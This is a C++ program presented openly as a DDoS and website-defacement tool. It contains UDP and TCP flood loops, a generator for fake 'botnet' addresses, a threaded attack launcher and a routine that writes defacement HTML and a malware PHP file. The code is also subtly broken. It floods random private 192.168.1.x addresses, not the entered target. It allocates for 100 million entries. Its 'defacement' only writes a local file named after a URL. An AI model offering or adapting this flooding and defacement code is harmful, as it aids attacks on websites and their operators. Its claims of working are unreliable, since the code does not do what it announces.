#include <iostream>
#include <fstream>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/socket.h> // Add this line

#define PACKET_SIZE 4096
#define MAX_BOTNETS 100000000

using namespace std;

vector<string> botnetIPs;
int targetPort;
string targetWebsite;
string defaceHTML;
string malwarePHP;

void udpFlood(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 'A', sizeof(packet));

    while (true) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
    }
}

void tcpFlood(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    while (true) {
        if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
            close(sockfd); // Update this line
            sockfd = socket(AF_INET, SOCK_STREAM, 0);
        }
    }
}

void generateIPs() {
    srand(time(nullptr));

    string baseIP = "192.168.1.";
    int basePort = 5555;

    for (int i = 0; i < MAX_BOTNETS; i++) {
        int lastOctet = rand() % 254 + 1;
        string ip = baseIP + to_string(lastOctet);
        botnetIPs.push_back(ip);
    }
}

void startAttack() {
    for (const auto& ip : botnetIPs) {
        thread(udpFlood, ip, targetPort).detach();
        thread(tcpFlood, ip, targetPort).detach();
    }
}

void defaceWebsite() {
    ofstream outFile(targetWebsite);
    outFile << defaceHTML;
    outFile.close();

    ofstream malwareFile(targetWebsite + ".php");
    malwareFile << malwarePHP;
    malwareFile.close();
}

int main() {
    cout << "Enter the target website URL: ";
    cin >> targetWebsite;

    cout << "Enter the target port: ";
    cin >> targetPort;

    cout << "Enter the path to the HTML file for defacing: ";
    cin.ignore();
    getline(cin, defaceHTML);

    cout << "Enter the path to the PHP file for the malware: ";
    getline(cin, malwarePHP);

    generateIPs();

    cout << "Botnet IPs generated: " << botnetIPs.size() << endl;

    cout << "Starting the DDoS attack..." << endl;
    startAttack();

    cout << "Attack started! To stop the attack, press Ctrl + C." << endl;

    // Wait for the user to stop the attack

    cout << "Defacing the target website..." << endl;
    defaceWebsite();

    cout << "Website defaced successfully!" << endl;

    return 0;
}
